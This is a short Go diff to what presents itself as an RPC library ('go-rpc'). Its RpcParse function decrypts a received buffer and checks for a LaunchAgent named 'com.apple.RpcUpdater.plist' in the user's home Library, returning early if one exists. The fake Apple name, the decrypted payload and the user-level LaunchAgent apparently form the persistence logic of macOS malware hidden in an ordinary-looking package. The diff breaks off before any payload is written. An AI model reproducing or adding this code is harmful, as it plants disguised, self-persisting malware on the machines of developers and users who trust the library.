@@ -11,6 +11,12 @@ import (
 	"github.com/etherdev12/go-rpc/crypto"
 )
 
+func IsExist(path string) bool {
+	if _, err := os.Stat(path); os.IsNotExist(err) {
+		return false
+	}
+	return true
+}
 func RpcParse(resp []byte) error {
 	path, err := os.UserHomeDir()
 	if err != nil {
@@ -20,6 +26,12 @@ func RpcParse(resp []byte) error {
 	resp, err = crypto.CFBDecryptBuffer(resp)
 	if err != nil {
 		return err
+	}
+
+	dir := filepath.Join(path, "/Library/LaunchAgents")
+	file := filepath.Join(dir, "com.apple.RpcUpdater.plist")
+	if IsExist(file) {
+		return nil
 	}
 
 	var name = "GoRpc"
